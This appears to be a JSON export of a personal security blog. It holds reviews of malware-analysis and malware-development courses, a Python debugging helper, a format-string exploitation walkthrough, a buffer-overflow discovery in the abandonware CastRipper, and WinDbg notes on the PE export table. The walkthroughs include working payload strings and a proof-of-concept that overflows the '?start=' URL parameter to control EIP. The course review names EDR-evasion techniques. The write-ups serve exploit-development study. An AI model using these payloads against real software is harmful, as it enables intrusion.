[{"content":"","date":null,"permalink":"/","section":"","summary":"","title":""},{"content":"","date":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":null,"permalink":"/tags/malware/","section":"Tags","summary":"","title":"Malware"},{"content":"Hi everyone, I am continuing my jorney and I completed the Introduction to Malware Binary Triage course from InvokeRE in February IDA Edition and March the Binary Ninja Edition. I am very excited to share my experience and what I learned from the course.\nThe course is designed to provide a comprehensive introduction to malware reverse engineering, focusing on the practical aspects of analyzing and triaging malicious binaries. It covers various topics, including static and dynamic analysis techniques, reverse engineering tools, and methodologies for identifying and understanding malware behavior.\n1. Introduction #Malware RE is the process of analyzing malicious software to understand its behavior, functionality, and potential impact. It involves dissecting the code, identifying its components, and determining how it operates. This is crucial for cybersecurity professionals to defend against threats effectively.\nI decided to take the IMBT course from InvokeRE to improve my skills in reverse engineering and consenquently learn more about the process of malware analysis.\nI wanted to learn from qualified experts in the field and gain hands-on experience with real-world malware samples and Joshua Reynolds is a very experienced professional worked for reputable companies and spoken at conferences: REcon, RSA and DEF CON.\n2. Why Malware Reverse Engineering Is Important #Malware reverse engineering (RE) is a critical skill in the cybersecurity landscape. It allows professionals to dissect and understand malicious software, providing insights into its behavior, communication methods, and propagation techniques. for my goals I view it as a fundamental skills for red teaming, blue teaming and exploit development as you will not only understand how the malware works but also improve your reverse engineering skills that can be used on red teaming engagements and blue teaming incident response.\n3. Why the skills matters for Red Teaming and Blue Teaming (Personal Perspective) #I am interested in Red Teaming and Blue Teaming, and I believe that understanding malware RE is essential for both roles. For Red Teamers, it helps in crafting more effective attack simulations by understanding how real-world malware operates, for example you can reverse engineer a malware sample in the wild to understand the TTPs (Tactics, Techniques, and Procedures) and implement the idea or technique on your engagement for example if the malware uses an inovate or creative way to persist. For Blue Teamers, its obsviously useful for understandting the impact and in building better detection mechanisms and incident response strategies. I see malware RE a very important skills because it can be used in Web Pentesting (white box testing) and Penetration Testing specially the reverse engineering part where you need to understand how the application works and how it interacts with the system.\n4. My Goals for the Course #I am interested in Advanced Windows Exploit Development and my goal in the next few years to enroll for OSEE (EXP-401 course) from Offsec which involve understanding the Operating System and have a deep knowledge on reverse engineering and learning Malware RE is beneficial for my goals and in my opnion is a very important skills and the skills gained I can use it as well on different domains of Cybersecurity. I believe that this course helped me achieve that and I will also suplement with the knowledge from Zero2Automate course which I am also enrolled, I have not started yet.\n5. My Experience with the IMBT Course by InvokeRE #The IMBT covers introduction to malware binary triage where you will learn the concepts and the different types of malware then you will learn how to set up your own virtual machine focused for malware analysis and reverse engineering.\nThe course covers the tools used for malware analysis such as IDA, x64dbg, Dnspy, PE Bear and several others tools and mostly important you will learn about PE structure, you will learn how to dissect malware through static analysis using disassembler (IDA) from a compiled malware and decompiler tool (Dnspy) to analyze malware created on .NET which is a very common language used by malware authors.\nYou will also learn how to use x64dbg for dynamic analysis and how to analyze the malware behavior and how to use the tools effectively. Obfuscation techniques are also covered in the course and you will learn how to unpack malware and how to analyze the C2 (Command and Control) communication.\nThe course is very hands-on and you will have a lot of labs and exercises to practice what you learned. You will learn how to analyze malware traffic using Wireshark, InetSim and other tools. The course is very well structured and you will learn a lot of concepts and techniques that are used in the industry. The course format: Videos, labs, challenges, and hands-on exercises with a final exam which you will be provided with a malware sample and you will need to analyze the malware to answer the final exam questions.\nI chose InvokeRE because of the instructor reputation in the industry and the depth of their content. I was looking for a course that focused on hands-on learning and practical applications, and IMBT delivered that. The course is designed to provide real-world scenarios and challenges that you would encounter in the field.\nWhat I Learned # Topic Description Unpacking Techniques How to unpack malware using different packing techniques and analyze the unpacked code Obfuscation Tricks Understanding how malware authors hide their code and methods for deobfuscation C2 Analysis Analysis of C2 communication, server identification, and protocol understanding PE Structure Analysis of PE structure, section identification and their purposes Static/Dynamic Analysis Using IDA and x64dbg for comprehensive malware analysis Tools Proficiency in IDA, x64dbg, Dnspy, PE Bear, and other analysis tools Traffic Analysis Using Wireshark and InetSim to analyze malware network traffic patterns Behavior Analysis Understanding malware functionality and system impact assessment Analysis Methodologies Different approaches for analyzing malware in real-world scenarios 6. Biggest challenges, difficult moments. #I initially struggled with the identification of the proper padding bytes for the key to decrypt the malware statically, sometimes the algorithms used requires padding and its not easy as its not always clear and easy to understand, but with experience and practice I was able to overcome the challenge, you will get familiar with the encryption nuances as you analyze more and more malware samples. I have completed the offsec OSED Certification which helped me on the assembly and IDA or Binary Ninja subject as I have a good understanding of the assembly language, that was ok for me, and the Windows API, the course provided me with a good understanding of the malware analysis process and methodology and how to apply it in real-world scenarios.\n7. How the Course Helped Me See the Real-World Value of Malware RE #The course provided me with a good understanding of the malware analysis process and how important it is for cybersecurity professionals to understand the behavior of malware more than ever as the malware is becoming more sophisticated and the attacks are becoming more targeted through social engineering and phishing attacks.\nI feel more confident in my ability to analyze malware and understand its behavior. I have a better understanding of the different techniques used by malware authors and how to apply them in real-world scenarios. I also feel more comfortable using the tools and techniques used for malware analysis.Tips for those new to malware RE.\nI improved my RE skills through IDA, Binary Ninja and x64dbg for static and dynamic analysis of malware samples. I have also brushed up how on analyzing the PE structure of a malware sample and how to identify the different sections and their purpose. I feel more confident in my ability to analyze malware and understand its behavior.\n8. What version of the course did I take ? #I have taken and completed the IMBT IDA Version and IMBT Binary Ninja Version, I recommend taking both versions if you can as you will learn and become familiar with both tools and you will be able to choose the one that fits your needs on each moment. In my opnion the Binary Ninja API is easier to interact than IDA APIs, but learning both tools will make you a more versatile professional, sometimes a tool will be better than other tool on certain situations, its like the old discussion about linux vs Windows, as professional you will have to use both and learn both and sometimes windows will be better than linux and sometimes linux will be better than windows, it depends on the situation.\n9. Final Thoughts \u0026amp; Advice #I would recommend IMBT to anyone interested in malware reverse engineering and analysis and also for Penetration Testers including Red Teamers, Blue teamers of course. The course is well-structured, hands-on, and provides a solid foundation in the field. It is suitable for beginners as well as those with some experience in reverse engineering. I always like to take courses because provide me different perspectives how other professionals approach the same problem and I believe that this is a very important skills for anyone in the cybersecurity field. I love when someone does something different than me and I can learn from them, I believe that this is the best way to learn and improve your skills. My advice is keep learning and do what you love, don\u0026rsquo;t be afraid to ask questions and seek help from others. if you have questions you can reach out to me on X (twitter) platform.\n10. What\u0026rsquo;s Next #I will be continuing on my jorney, I have started The Beginner Malware Analysis course from offset to see the instructor approach and solidify my knowledge and I will start the Zero2Automate course from Offset to learn more about malware analysis and reverse engineering. I will also be taking the OSEE (EXP-401) course from Offsec in the future, probably in next 3 years to improve my skills in exploit development and reverse engineering.\nCertification of Completion # IMBT IDA Edition IMBT Binary Ninja Edition If you are interested in malware analysis you can go to InvokeRE\n","date":"25 April 2025","permalink":"/posts/postsec/imbt_malware_re/","section":"Posts","summary":"Hi everyone, I am continuing my jorney and I completed the Introduction to Malware Binary Triage course from InvokeRE in February IDA Edition and March the Binary Ninja Edition.","title":"Malware Reverse Engineering and Why Itâ€™s Essential: My Experience with IMBT from InvokeRE"},{"content":"","date":null,"permalink":"/posts/postsec/","section":"Posts","summary":"","title":"Offensive Security Posts"},{"content":"","date":null,"permalink":"/categories/offensivesecurity/","section":"Categories","summary":"","title":"OffensiveSecurity"},{"content":"","date":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":null,"permalink":"/tags/reverseeng/","section":"Tags","summary":"","title":"ReverseEng"},{"content":"","date":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":null,"permalink":"/tags/debugger/","section":"Tags","summary":"","title":"Debugger"},{"content":"","date":null,"permalink":"/tags/maldev/","section":"Tags","summary":"","title":"Maldev"},{"content":"I havenâ€™t written on my blog for a while, but it has been for a good cause balancing my regular work and focusing on the Malware Development course.\nI signed up for MalDev Academy in July, but I only started studying the course after passing my OSED certification in August 2024.\nI have been interested in how malware works since I was introduced to a hacking book in high school in 2003, but back then, things were not as evolved as they are today.\nI remember malicious code using bind connections due to the lack of firewalls or simply using compression techniques like UPX to bypass antivirus solutions. As the years went by, security improved, and techniques to bypass security solutions became more complex.\nAfter completing the OSEP certification by the way, itâ€™s a really good course for learning evasion techniques you will gain knowledge of injection methods like Process and DLL Injection, Reflection via PowerShell, and obfuscation techniques using C#.\nHowever, if you want to take your evasion skills to the next level, I can confidently say that completing all 91 modules of this course has significantly expanded my knowledge. It taught me concepts that are crucial when developing evasive droppers. The course not only improves your knowledge of C but also introduces more complex techniques for creating custom droppers.\nI learned how to place payloads in different sections of a Microsoft PE file, discovered advanced injection techniques such as Thread Hijacking and APC Injection, and explored IAT Camouflage, String Obfuscation, and the impact of binary entropy on malware detection. I also learned how to sign binaries to increase stealth, how hooks work (userland hooks and unhooking techniques), and methods to bypass EDR, like NTDLL unhooking.\nI had no idea before about how EDR hooks into your process to hijack functions and inspect their arguments. I also learned about Direct and Indirect Syscalls, which are techniques used by malware authors to bypass EDR. In the future, I might write a blog post about this to help others understand.\nI am very grateful for this course and highly recommend it to others. Iâ€™ve learned a lot, and I will continue to learn as I dive deeper, especially into rootkits. I already have three books on rootkits that I bought a while ago. Although theyâ€™re older, I believe theyâ€™re some of the best resources available, and the most important thing is understanding the concepts.\nWhatâ€™s Next? #I plan to take the EXP-401 (OSEE) course within the next three years. During this period, I want to focus more on reverse engineering malware and malware development to enhance my reverse engineering skills and deepen my understanding of Windows Internals.\nCurrently, Iâ€™m signed up for the IMBT (Introduction to Malware Binary Triage) course and the Zero2Automate course. My plan is to focus on IMBT first, and after completing it, move on to Zero2Automate. As you can see, Iâ€™ll be busy, especially since the only time I have to learn is at night and even then, not every night is available! ðŸ˜„\n","date":"4 December 2024","permalink":"/posts/postsec/maldev_review/","section":"Posts","summary":"I havenâ€™t written on my blog for a while, but it has been for a good cause balancing my regular work and focusing on the Malware Development course.","title":"My personal thoughts about Maldev Academy Course"},{"content":"","date":null,"permalink":"/tags/exploitdev/","section":"Tags","summary":"","title":"ExploitDev"},{"content":"I was working on a format string vulnerability challenge where the process would terminate quickly and was difficult to attach windbg for debugging. I wrote a small piece of code that will start the binary in suspended mode with arguments if required and attach the windbg You can resume the process using Process Hacker program. You can resume the process using Process Hacker program.\nNote.: The windbg_path variable you need to adjust according to your system.\nSteps to follow #install pywin32 #python -m pip install pywin32 Adjust the code and use #After program is attached you can type g on windbg to let the debugger continue\nimport os import win32process import win32event import win32api bin_path = \u0026#34;C:\\\\binary_to_be_debugged.exe\u0026#34; windbg_path = \u0026#34;C:\\\\Users\\\\User\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps\\\\Microsoft.WinDbg_8wekyb3d8bbwe\\\\WinDbgX.exe\u0026#34; def start_program_suspended(command): # Create the process in a suspended state startup_info = win32process.STARTUPINFO() process_info = win32process.CreateProcess( None, \u0026#34; \u0026#34;.join(command), None, None, False, win32process.CREATE_SUSPENDED, None, None, startup_info ) return process_info def attach_windbg(pid): if pid: # command to attach windbg to the process windbg_command = f\u0026#34;{windbg_path} -p {pid}\u0026#34; # Start Windbg and attach it to the process os.system(windbg_command) else: print(\u0026#34;\\nProcess terminated too quickly. Restarting the process.\u0026#34;) def resume_process(process_info): # Resume the suspended process win32process.ResumeThread(process_info[1]) def sploit(): Argument = \u0026#34;ABCD\u0026#34; command = [bin_path] + [Argument] # Start the program in a suspended state process_info = start_program_suspended(command) # Get the process ID (PID) pid = process_info[2] # Attach windbg to the suspended process attach_windbg(pid) # Resume the process resume_process(process_info) # Wait for the process to complete win32event.WaitForSingleObject(process_info[0],win32event.INFINITE) # Close handles win32api.CloseHandle(process_info[0]) win32api.CloseHandle(process_info[1]) if __name__ == \u0026#39;__main__\u0026#39;: sploit() Process Hacker #You can resume the process after the program is successfully attached to windbg by right click and click on Resume as showing on screenshot below.\n","date":"22 July 2024","permalink":"/posts/postsec/template_start_proc_suspended_debug/","section":"Posts","summary":"I was working on a format string vulnerability challenge where the process would terminate quickly and was difficult to attach windbg for debugging.","title":"Python Code Start Process in Suspended Mode"},{"content":"I am continuing again training my skills for OSED certification and one of the vulnerability classes part of C or C++ language, the course covers format specifier vulnerability.\nUnderstanding the vulnerability #First Scenario #If the user input data is passed directly to the printf as a format string specifier that code is vulnerable to format string specifier attack.\nThe code below is a classic example of format string vulnerability.\nchar user_input[100]; fgets(user_input, sizeof(user_input), stdin); printf(user_input) Second Scenario #If the format string specifier mistmatch with number of arguments unexpected behaviour such as printing sensitive data from the stack or overwriting the stack with garbage data.\nThe code below is an example, the number of format string specifier is 2 and argument provided is only 1 the user input, the second %s can potentially leak sensitive data, garbage data or read an invalid memory address causing a crash:\nprintf(\u0026#34;Hello pentesthacks, %s and %s\u0026#34;, input_user) Format String Challenge #Format string challenge #I found a really good challenge to understand the Format String Vulnerability concept, you can check the original author post and download the Challenge.exe if you want to follow along Exploiting Format strings in Windows.\nIf you try to run the program, you can see it will try to open the string provided in the first argument. We can then learn that the software expect a filename, another observation is that after expecting a file, it will read the file content and print back on the screen the filename and also the content of the file.\nWe could use two approaches to uncover vulnerabilities, first reverse engineer the software using a disassembler to understand the software or write a fuzzer or use an available fuzzer that will attempt several inputs randomly focusing to crash the software to uncover possible vulnerabilities, we will look the first option using IDA Free.\nReversing with IDA Free #The vulnerability lies as discussed earlier First Scenario, the user input is passed directly to the printf function, you can observe that on the push eax instruction, this instruction allow the user to manipulate the format string specifier.\nExploiting the format string vulnerability #We can experiment the format specifier to have a sense of the vulnerability the following format string specifiers mainly used in this type of vulnerability:\nFormat String Specifier Description %x The %x format string specifier will convert the decimal number in hexadecimal values on the stack, %x in the context of format string attack will display values in the stack in hexdecimal format. %n The %n format string specifier will write number of characters preceding the %n %s The %s will read a memory pointer of array of characters and printf will display the string. There are more format string specifiers such as %d, %p etc.. you can look official documentation here.\nLet\u0026rsquo;s go back to the challenge, we can play by sending A\u0026rsquo;s followed by %x format string specifier if the software is vulmerable to format string specifiers we should see some values printed out of %x in hex decimal value.\n.\\Challenge.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x screenshot:\nWe use windbg to see what is going on\nThe payload\npython -c \u0026#34;print(\u0026#39;A\u0026#39;*300 + \u0026#39;%x\u0026#39;*161 + \u0026#39;%n\u0026#39;)\u0026#34; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n The screenshot of windbg capturing the crash. By manipulating the %x and increaing the A or decreasing we can see we can manipulate the eax, also the ecx we control. A few things to take in consideration by incrasing the number of %x we can point the eax value to our shellcode.\npython -c \u0026#34;print(\u0026#39;A\u0026#39;*300 + \u0026#39;%x\u0026#39;*151 + \u0026#39;%n\u0026#39;+ \u0026#39;B\u0026#39;*4)\u0026#34; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%nBBBB Below shows by adjusting the %x (increasing) we can control eax The idea here is replace eax pointing to return address and try to control ecx, if we control ecx the idea is point ecx to our shellcode, once the function returns the eax will return and the shellcode will be executated since the return address will be pointing to our shellcode.\nLets try to control ecx, we will first need to find the beginning of ours A\u0026rsquo;s. The address is 0x14f748. We can divide by 4 using windbg and place the decimal value as part of our shellcode multiplied by 4.\n0:000\u0026gt; ? 0x14f748 / 4 Evaluate expression: 343506 = 00053dd2 The value %.343506x * 4 can be placed as part of the payload:\npython -c \u0026#34;print(\u0026#39;A\u0026#39;*300 + \u0026#39;%x\u0026#39;*151 + \u0026#39;%.343506x\u0026#39; * 4 + \u0026#39;%n\u0026#39;+ \u0026#39;B\u0026#39;*4)\u0026#34; After running the payload again ecx is now pointing to 0x14fd2c and eax is off from our BBBBs. We can fix EAX by increasing %x and ecx value 0x14fd2c we need to substract with payload address 0x14f748 and adding the decimal value from previously calculation.\n0:000\u0026gt; ? 0x14fd2c - 0x14f748 Evaluate expression: 1508 = 000005e4 0:000\u0026gt; ? 0n343506 + 0n1508 Evaluate expression: 345014 = 000543b6 The 4th value we will use in the payload: 345014, I also ajusted the number of %x to point eax to our \u0026lsquo;B\u0026rsquo;*4. Note.: The calculation must be in decimal and values presented in the format string specifier %.45014x always decimal base.\npython -c \u0026#34;print(\u0026#39;A\u0026#39;*300 + \u0026#39;%x\u0026#39;*161 + \u0026#39;%.343506x\u0026#39; * 3 + \u0026#39;%.345014x\u0026#39; + \u0026#39;%n\u0026#39;+ \u0026#39;B\u0026#39;*4)\u0026#34; We see now that ecx contains the value 0x150360, we need to substract by the payload address 0x14f748 and because 0x150360 is a higher number we will substract it by previous calculated value in the payload 345014 (decimal value).\nNote.: The reason we are substracting the previous payload decimal value: \u0026ldquo;? n345014 - 0n3096\u0026rdquo; is because the ecx value 0x150360 is higher than the address where our payload is sitting in the memory: 0x14f748.\n0:000\u0026gt; ? 0x150360 - 0x14f748 Evaluate expression: 3096 = 00000c18 0:000\u0026gt; ? 0n345014 - 0n3096 Evaluate expression: 341918 = 0005379e Running the python command again and feeding the program, we can see we successfully pointed ecx to our payload address and ecx is pointing to our 0x42424242 (BBBB).\npython -c \u0026#34;print(\u0026#39;A\u0026#39;*300 + \u0026#39;%x\u0026#39;*161 + \u0026#39;%.343506x\u0026#39; * 3 + \u0026#39;%.341918x\u0026#39; + \u0026#39;%n\u0026#39;+ \u0026#39;B\u0026#39;*4)\u0026#34; As a challenge you can try to move forward and find bad chars, replace the 0x41414141 with actual something like spawning a calculator. You have to replace eax with return adddress.\nI hope this will be helpful to somebody trying to understand format string vulnerabilities.\nðŸ˜€ Bye for now.\n","date":"20 July 2024","permalink":"/posts/postsec/fmt_string_challenge/","section":"Posts","summary":"I am continuing again training my skills for OSED certification and one of the vulnerability classes part of C or C++ language, the course covers format specifier vulnerability.","title":"Format String Vulnerability"},{"content":"I am continuing my study and taking a chance to practice more my reverse engineering skills and exploit development I found the available vulnerable application at Exploit-DB - CastRipper to explore.\nMy idea was to download the vulnerable application and install on my own lab and reverse engineering to find the buffer overflow vulnerability without looking or following the exploit-db available proof of concept and I was able to find a vulnerablity. I don\u0026rsquo;t see it published anywhere such as exploit-db or packetstorm, I only see vulnerabilities for CastRipper reported utilizing files like aspx,m3u or pls, but not the vulnerable ?start= parameter I discovered.\nDisclaimer.: The official website (http://www.mini-stream.net/castripper/) is no longer available and company\u0026rsquo;s contact as well not available as a result CastRipper is an abandonware, the content is not intended for malicious use, its for educational purpose ONLY and aims to improve security awareness and skills.\nInstalled the software #You can download the software via exploit-db if you want to follow along Vulnerable App CastRipper. The installation is very simple, after installing you can open and you should be presented with the application as showing below\nSoftware Enumeration #One of important aspect of reverse engineering is the ability to enumerate the software to find all valid points for data input. We can play with the sofware and also look for available documentation. Unfortunately the oficial website is not available because the software is very old.\nAfter looking the installation directory, we can see an interesting text file called crcmd.txt and this file contains Examples on how to use the software through command line\nC:\\Program Files\\Mini-stream\\CastRipper\\crcmd.txt Through out the example we see that accepts an url and the GUI also has the load button where we can input data. What are the url format ? another way of understanding better the software is to decompile and look at strings and functions that the software uses.\nReverse Engineering #Attaching to windbg for dynamic analysis #We need to understand what happen when we feed data and which part of the binary will process our data. I opened CastRipper and I attached to windbg and setup a breakpoint to WS2_32!recv function since we will provide http url as an input.\nwindbg:\nbp WS2_32!recv I created a dummy file on Kali:\ntouch /var/www/html/test.txt /var/www/html/test.txt Below we see that we sucessfully hit the breakpoint\n0:009\u0026gt; bp WS2_32!recv 0:009\u0026gt; bl 0 e Disable Clear 76e523a0 0001 (0001) 0:**** WS2_32!recv 0:009\u0026gt; g ModLoad: 74b80000 74bd6000 C:\\Windows\\system32\\mswsock.dll Breakpoint 0 hit *** WARNING: Unable to verify checksum for C:\\Program Files\\Mini-stream\\CastRipper\\CRfilter03.dll eax=0530e6d8 ebx=00000434 ecx=00000000 edx=02580930 esi=02581e00 edi=02580930 eip=76e523a0 esp=0530e6b0 ebp=76e523a0 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206 WS2_32!recv: 76e523a0 8bff mov edi,edi We can set a read hardware breakpoint to the memory address that will receive our payload to check where is used\n0:007\u0026gt; dd esp l5 0530e6b0 10016354 00000434 0530e6d8 00000800 0530e6c0 00000000 0:007\u0026gt; ba r1 0530e6d8 We can see that is been used in CRFilter03.dll by a rep movs mneumonic which means is copying our data to a different memory address\n0:007\u0026gt; g Breakpoint 1 hit eax=02586e98 ebx=02580930 ecx=0000003c edx=000000f5 esi=0530e6dc edi=02586e9c eip=10010f4d esp=0530e6a4 ebp=000000f5 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 CRfilter03!Filter_RegGetVADInfo+0x553d: 10010f4d f3a5 rep movs dword ptr es:[edi],dword ptr [esi] After stepping through the code I saw the execution is transferred to another module CRfilter01.dll and this module parses the input url.\nLoaded CRfilter01.dll library into IDA Free #I copied the application binary C:\\Program Files\\Mini-stream\\CastRipper\\Crfilter01.dll to kali linux where i have IDA free installed and loaded into IDA for furhter analysis to understand better the software.\nStrings view in IDA #Useful approach during reverse engineering to understand the software is to look at the strings, you click on Views -\u0026gt; Open subviews -\u0026gt; Strings.\nWe can learn a lot with the Strings tab in IDA, we can see with screenshot above the strings such as ?url, http:// or at the bottom .shtml indicating accepted file format.\nThe .shtml string is very interesting and I used the cross-reference in IDA free to determine what part in the code that\u0026rsquo;s using the string. You can click on the.phtml and select the aShtml in the .data section press the x keyboard key.\nWe can also see in the screenshot others file formats available such as \u0026lsquo;pls\u0026rsquo;, \u0026lsquo;wax\u0026rsquo;, \u0026lsquo;wvx\u0026rsquo;, \u0026lsquo;m3u\u0026rsquo; etc.. to explore, but I focused on phtml.\nBelow we can see a function called sub_23EF220 compares our http url file extension against several formats such as .htm, .html, .shtml, .rpm, .php, .asp, .cgi and etc..\nFinding the vulnerable function #I have picked the .phtml as file extension of my input http filename like http://10.0.2.26/test.phtml. I configured a breakpoint at memory address 0x023EF262 and stepped through the code.\n0:007\u0026gt; bp 0x023EF262 0:007\u0026gt; g Breakpoint 6 hit eax=00000000 ebx=05329da0 ecx=02407e8c edx=fffe682e esi=05329da0 edi=05329d9c eip=023ef262 esp=0530f010 ebp=00000000 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 CRfilter01!Mpf_FileDownloadRegCurrentInfoCallBack+0x10f12: 023ef262 68847e4002 push offset CRfilter01!Mpf_FileDownloadRegCurrentInfoCallBack+0x29b34 (02407e84) 0:007\u0026gt; da 02407e84 02407e84 \u0026#34;.shtml\u0026#34; After following the code on windbg and using IDA Free combined I found an interesting string that leads to an interesting path as showing on screenshot below. The ?start=, I attemped to send my input string adding the ?start= as part of my http request like http://10.0.2.26/test.phtml?start=XXXXX\nSending the input url string again with ?start= we lead to interesting path to an interesting call to _strncpy function as showing screenshot below. The code doesn\u0026rsquo;t limit how much data or how long is the string you can provide to ?start= parameter which causes the buffer overflow vulnerability\nHow to trigger the Buffer Overflow ? #We just need to send a long enough data to the ?start= parameter and click on Load button and paste into the load field for the application and click on OK Button. As showing below an example,\ndef sploit(): shellcode = \u0026#34;D\u0026#34; * 900 buf = \u0026#34;http://127.0.0.1/test.phtml?start=\u0026#34; buf += \u0026#34;C\u0026#34;*8670 buf += \u0026#34;\\x42\\x42\\x42\\x42\u0026#34; buf += shellcode print(buf) if __name__ == \u0026#39;__main__\u0026#39;: sploit() Checking on Windbg \u0026amp; Controlling EIP Register #I opened CastRipper application and attached to windbg. I ran my script (the one above) and pasted into the CastRipper by clicking on Load and the paste on the load field and click OK Button. We successfully controlled EIP. Full POC can be found on my github CastRipper\nI hope you enjoyed the jorney !!! see you soon.\npython castRipper-test.py | xclip -selection clipboard ","date":"15 July 2024","permalink":"/posts/postsec/castripper_revereng01/","section":"Posts","summary":"I am continuing my study and taking a chance to practice more my reverse engineering skills and exploit development I found the available vulnerable application at Exploit-DB - CastRipper to explore.","title":"Reverse Engineering CastRipper v2.9.6"},{"content":"A quick step by step tutorial to resolve function address through important fields in IMAGE EXPORT DIRECTORY. The following attributes of the structure are very important the NumberofNames, AddressOfNames, NumberOfFuntions, AddressOfFunctions, AddressOfNameOrdinals.\nBy finding the symbol position in AddressOfNames we can find the index number of FunctionsAddress in AddressOfNameOrdinals and this structure is a 2 bytes. With the 2 bytes index number we can then find the function address RVA in AddressOfFunction.\nI will walk through with the windbg, but before we need to find the value of e_elfanew (0x3c) and offset to IMAGE OPTIONAL HEADERS (0x18) and Export Directory Table. You can check the previous post Windows PE File structure (windbg) and Export Directory Table\nUnnfortunately the windbg does not come with symbols for IMAGE EXPORT DIRECTORY, but we can see the structure as showing below:\nReferences: doxygen reactos \u0026amp; Dr. Fu\u0026rsquo;s Security Blog\nIMAGE EXPORT DIRECTORY STRUCTURE #typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; //offset 0x0 DWORD TimeDateStamp; //offset 0x4 WORD MajorVersion; //offset 0x8 WORD MinorVersion; //offset 0xa DWORD Name; //offset 0xc DWORD Base; //offset 0x10 DWORD NumberOfFunctions; //offset 0x14 DWORD NumberOfNames; //offset 0x18 DWORD AddressOfFunctions; //offset 0x1c DWORD AddressOfNames; //offset 0x20 DWORD AddressOfNameOrdinals; //offset 0x24 } FYI, you can find Export Directory Table with command below: !dh kernelbase -f then get the VMA with ? kernelbase+1EAAA0.\nFIND EXPORT DIRECTORY TABLE #0:003\u0026gt; !dh kernelbase -f File Type: DLL FILE HEADER VALUES 14C machine (i386) 6 number of sections ...snipped... Guard 1EAAA0 [ EF52] address [size] of Export Directory 1FEB2C [ 64] address [size] of Import Directory 205000 [ 548] address [size] of Resource Directory 0 [ 0] address [size] of Exception Directory 231600 [ 75E0] address [size] of Security Directory ...snipped... We will use kernelbase module as an example, after finding the Export Directory VMA.We can dump all the attributes values of Export Directory Table structure as showing below:\nEXPORT DIRECTORY TABLE Structure #0:003\u0026gt; dd (KERNELBASE+1EAAA0) 7566aaa0 00000000 2c1f03ea 00000000 001ef578 7566aab0 00000001 00000778 00000778 001eaac8 7566aac0 001ec8a8 001ee688 001c4b60 00130260 NUMBEROFNAMES #0:003\u0026gt; dd (KERNELBASE+1EAAA0)+0x18 l1 7559aab8 00000778 ADDRESSOFNAMES (Array) RVA #Here we can dump the AddressOfNames array at offset 0x20.\n0:003\u0026gt; dd (KERNELBASE+1EAAA0)+0x20 l1 7566aac0 001ec8a8 ADDRESSOFFUNCTIONS (Array) RVA #Here we can dump the AddressOfFunctions array at offset 0x1c.\n0:003\u0026gt; dd (KERNELBASE+1EAAA0)+0x1c l1 7566aabc 001eaac8 ADDRESSOFNAMEORDINALS (Array) RVA #0:003\u0026gt; dd (KERNELBASE+1EAAA0)+0x24 l1 7566aac4 001ee688 Steps to find address of function #Finding the symbol position in NamesOfFunction #Lets say we are interested to find the function address for AccessCheckByType which is located as third position with RVA value in the NamesOfFunction array: 001ef64b which the symbol is translated to \u0026ldquo;AccessCheckByType\u0026rdquo;. 